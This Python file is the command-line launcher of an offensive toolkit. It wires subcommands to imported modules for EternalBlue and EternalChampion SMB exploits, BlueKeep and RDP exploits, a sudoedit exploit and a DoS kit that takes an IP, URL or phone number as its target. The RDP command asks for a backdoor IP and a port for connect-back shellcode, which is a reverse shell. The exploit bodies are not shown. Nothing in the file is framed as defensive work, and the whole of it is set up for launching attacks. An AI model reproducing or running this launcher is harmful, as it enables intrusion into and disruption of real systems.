import argparse
import sys
from pathlib import Path

# Add the current directory to the Python path
sys.path.append(str(Path(__file__).resolve().parent))

# Import necessary modules
from flaws.mkdos import main as mkdos_main
from exploits.sudoedit.sudoedit_exploit import run_sudoedit_exploit
from exploits.windows.rdp_exploits.exploit import main as rdp_main
from exploits.windows.rdp_exploits.bluekeep.exploit import main as bluekeep_main
from exploits.windows.rdp_exploits.attack_suite.poc_rdpsnd_fill import main as bluekeep2_main
from exploits.windows.rdp_exploits.dos import main as bluekeep_scanner_main
from exploits.windows.smb_exploits.eternalblue.exploit1 import main as eternalblue_main
from exploits.windows.smb_exploits.eternalblue.exploit2 import main as eternalblue2_main
from exploits.windows.smb_exploits.eternalblue.poc import main as eternalblue3_main
from exploits.windows.smb_exploits.eternalchampion.poc1 import main as eternalchampion_main
from exploits.windows.smb_exploits.eternalchampion.poc2 import main as eternalchampion2_main
from exploits.windows.smb_exploits.eternalchampion.leak import main as eternalchampion3_main
from exploits.windows.smb_exploits.eternalromance.poc1 import main as eternalromance_main
from exploits.windows.smb_exploits.eternalromance.poc2 import main as eternalromance2_main
from exploits.windows.smb_exploits.eternalromance.leak import main as eternalromance3_main
from exploits.windows.smb_exploits.eternalsynergy.poc import main as eternalsynergy_main
from exploits.windows.smb_exploits.eternalsynergy.leak import main as eternalsynergy2_main

def main():
    parser = argparse.ArgumentParser(description="Unified Framework CLI")
    
    subparsers = parser.add_subparsers(dest="command", help="Available commands")
    
    # Subcommand: mkdos
    parser_mkdos = subparsers.add_parser("mkdos", help="Run the MkDoS attack toolkit")
    parser_mkdos.add_argument("--target", type=str, required=True, help="Target IP:port, URL, or phone")
    parser_mkdos.add_argument("--method", type=str, required=True, help="Attack method")
    parser_mkdos.add_argument("--time", type=int, default=10, help="Duration of the attack in seconds")
    parser_mkdos.add_argument("--threads", type=int, default=3, help="Number of threads to use")

    # Subcommand: exploit
    parser_exploit = subparsers.add_parser("exploit", help="Run an exploit")
    exploit_subparsers = parser_exploit.add_subparsers(dest="exploit_type", help="Type of exploit")

    # Subcommand: sudoedit exploit
    parser_sudoedit = exploit_subparsers.add_parser("sudoedit", help="Run the SudoEdit exploit")
    parser_sudoedit.add_argument("target", type=str, help="Target for the SudoEdit exploit")

    # Subcommand: RDP exploit
    parser_rdp = exploit_subparsers.add_parser("rdp", help="Run RDP exploit")
    parser_rdp.add_argument("rdp_host", type=str, help="Target RDP server's IP address")
    parser_rdp.add_argument("--backdoor_ip", type=str, required=True, help="IP address for connect-back shellcode")
    parser_rdp.add_argument("--rdpport", type=int, default=3389, help="Target RDP server's port number")
    parser_rdp.add_argument("--backport", type=int, default=4444, help="Port number for connect-back shellcode")

    # Subcommand: SMB exploits
    parser_smb = exploit_subparsers.add_parser("smb", help="Run SMB exploits")
    smb_subparsers = parser_smb.add_subparsers(dest="smb_exploit_type", help="Type of SMB exploit")

    # Subcommand: EternalBlue
    parser_eternalblue = smb_subparsers.add_parser("eternalblue", help="Run EternalBlue exploit")
    parser_eternalblue.add_argument("target", type=str, help="Target for the EternalBlue exploit")
    
    # Subcommand: EternalChampion
    parser_eternalchampion = smb_subparsers.add_parser("eternalchampion", help="Run EternalChampion exploit")
    parser_eternalchampion.add_argument("target", type=str, help="Target for the EternalChampion exploit")

    # Subcommand: Loki
    parser_loki = subparsers.add_parser("loki", help="Run Loki network analysis tool")
    parser_loki.add_argument("--scan", action="store_true", help="Run a scan with Loki")

    args = parser.parse_args()

    if args.command == "mkdos":
        mkdos_main(args.target, args.method, args.time, args.threads)
    elif args.command == "exploit":
        if args.exploit_type == "sudoedit":
            run_sudoedit_exploit()
        elif args.exploit_type == "rdp":
            rdp_main(args.rdp_host, args.rdpport, args.backdoor_ip, args.backport)
        elif args.exploit_type == "smb":
            if args.smb_exploit_type == "eternalblue":
                eternalblue_main(args.target)
            elif args.smb_exploit_type == "eternalchampion":
                eternalchampion_main(args.target)
    elif args.command == "loki":
        if args.scan:
            print("Running Loki scan...")  # Replace with actual Loki scan function
    else:
        parser.print_help()

if __name__ == "__main__":
    main()